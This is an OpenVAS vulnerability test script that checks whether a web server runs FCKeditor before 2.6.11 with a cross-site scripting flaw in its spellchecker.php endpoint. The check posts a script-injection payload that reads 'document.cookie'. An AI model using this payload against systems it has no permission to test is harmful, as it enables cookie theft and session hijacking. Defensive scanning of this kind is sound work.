###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fckeditor_textinputs_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# FCKeditor 'print_textinputs_var()' Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804701");
  script_version("$Revision: 11867 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-07-01 12:07:59 +0530 (Tue, 01 Jul 2014)");
  script_name("FCKeditor 'print_textinputs_var()' Multiple Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with FCKeditor and is prone to multiple cross site
  scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not.");

  script_tag(name:"insight", value:"Input passed via the keys and values of POST parameters to
  editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
  is not properly sanitised in the 'print_textinputs_var()' function before being
  returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"FCKeditor version prior to 2.6.11");

  script_tag(name:"solution", value:"Upgrade to FCKeditor version 2.6.11 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49606");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2014/Jun/14");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126902");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"http://ckeditor.com");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/fckeditor", "/editor", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/editor/fckeditor.html"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(">FCKeditor<" >< rcvRes)
  {
    url = dir + '/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php';
    host = http_host_name(port:http_port);
    postData = "textinputs[</script><script>alert(document.cookie)</script>]=zz";
    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n",
                    "\r\n", postData);
    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:FALSE);

    ## Extra check is not possible
    if(rcvRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
